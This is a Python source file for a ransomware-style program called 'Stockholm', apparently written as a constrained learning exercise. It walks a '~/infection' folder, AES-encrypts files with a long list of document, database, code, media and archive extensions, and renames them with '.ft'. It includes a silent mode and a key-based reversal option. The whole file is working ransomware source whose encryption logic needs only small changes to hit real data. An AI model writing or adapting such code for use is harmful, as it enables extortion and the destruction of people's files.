import os
import argparse
from cryptography.hazmat.primitives import ciphers, hashes, padding
from cryptography.hazmat.backends import default_backend

INFECTED_DIR = os.path.join(os.environ["HOME"], "infection")
AFFECTED_EXTENSIONS = [
    '.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw',
    '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif',
    '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm',
    '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb',
    '.mdb', '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf',
    '.sln', '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd',
    '.bat', '.ps1', '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp',
    '.php', '.asp', '.rb', '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf',
    '.fla', '.wmv', '.mpg', '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp',
    '.mkv', '.3g2', '.flv', '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai',
    '.psd', '.nef', '.tiff', '.tif', '.cgm', '.raw', '.gif', '.bmp', '.jpg', '.jpeg',
    '.vcd', '.iso', '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak',
    '.tbk', '.bz2', '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm',
    '.sldx', '.sti', '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf',
    '.wk1', '.wks', '.123', '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml',
    '.msg', '.ost', '.pst', '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps',
    '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt',
    '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm',
    '.docb', '.docx', '.doc'
]

def encrypt_decrypt_file(filepath, key, action):
    success = True
    try:
        with open(filepath, 'rb') as f:
            data = f.read()

        iv = data[:16]

        cipher = ciphers.Cipher(ciphers.algorithms.AES(key), ciphers.modes.CBC(iv), backend=default_backend())

        if action == "encrypt":
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data[16:]) + padder.finalize()
            encryptor = cipher.encryptor()
            result = iv + encryptor.update(padded_data) + encryptor.finalize()

        else:
            decryptor = cipher.decryptor()
            decrypted_data = decryptor.update(data[16:]) + decryptor.finalize()
            unpadder = padding.PKCS7(128).unpadder()
            result = iv + unpadder.update(decrypted_data) + unpadder.finalize()

        with open(filepath, 'wb') as f:
            f.write(result)

    except Exception as e:
        success = False
        print(f"Error processing {filepath}: {str(e)}")
        return

    if action == "decrypt" and success:
        os.rename(filepath, filepath[:-3])

def main():
    parser = argparse.ArgumentParser(description="Stockholm")
    parser.add_argument('-r', '--reverse', help='Reverse the infection given the decryption key', type=str)
    parser.add_argument('-s', '--silent', help='Run in silent mode', action='store_true')
    parser.add_argument('-v', '--version', help='Show version', action='store_true')
    args = parser.parse_args()

    if args.version:
        print("Stockholm Version 1.0")
        return

    if not os.path.exists(INFECTED_DIR):
        print(f"Error: Directory {INFECTED_DIR} not found.")
        return

    if args.reverse:
        key_string = args.reverse
        if len(key_string) != 64 or not all(c in '0123456789abcdef' for c in key_string):
            print("Error: Invalid key format. Make sure you send a 32 byte hexadecimal key.")
            return
        key = bytes.fromhex(args.reverse)
        action = "decrypt"
    else:
        key = os.urandom(32)
        if not args.silent:
            print(f"Generated Key (for decryption): {key.hex()}")
        action = "encrypt"

    for root, _, files in os.walk(INFECTED_DIR):
        for file in files:
            _, ext = os.path.splitext(file)

            if action == "decrypt" and ext == ".ft":
                filepath = os.path.join(root, file)
                if not args.silent:
                    print(f"Processing {filepath}")
                encrypt_decrypt_file(filepath, key, action)

            elif action == "encrypt" and ext in AFFECTED_EXTENSIONS:
                filepath = os.path.join(root, file)
                if not args.silent:
                    print(f"Processing {filepath}")
                encrypt_decrypt_file(filepath, key, action)
                if not file.endswith('.ft'):
                    os.rename(filepath, filepath + ".ft")

if __name__ == "__main__":
    main()
